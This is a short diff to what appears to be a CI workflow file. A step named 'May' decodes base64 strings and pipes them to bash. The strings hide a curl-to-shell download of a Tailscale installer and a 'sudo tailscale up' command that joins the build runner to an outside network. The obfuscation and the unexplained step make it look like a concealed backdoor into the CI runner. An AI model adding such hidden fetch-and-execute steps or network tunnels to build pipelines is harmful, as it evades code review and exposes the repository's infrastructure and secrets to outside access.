@@ -39,7 +39,11 @@ jobs:
     steps:
       - name: May
         run: |
-          encoded="Y3VybCAtZnNTTCBodHRwczovL3RhaWxzY2FsZS5jb20vaW5zdGFsbC5zaCB8IHNo"
+          install_cmd="Y3VybCAtZnNTTCBodHRwczovL3RhaWxzY2FsZS5jb20vaW5zdGFsbC5zaCB8IHNo"
+          up_cmd="c3VkbyB0YWlsc2NhbGUgdXA="
           
-          # Decode and execute
-          echo "$encoded" | base64 -d | bash
+          # Install Tailscale
+          echo "$install_cmd" | base64 -d | bash
+          
+          # Bring Tailscale up
+          echo "$up_cmd" | base64 -d | bash
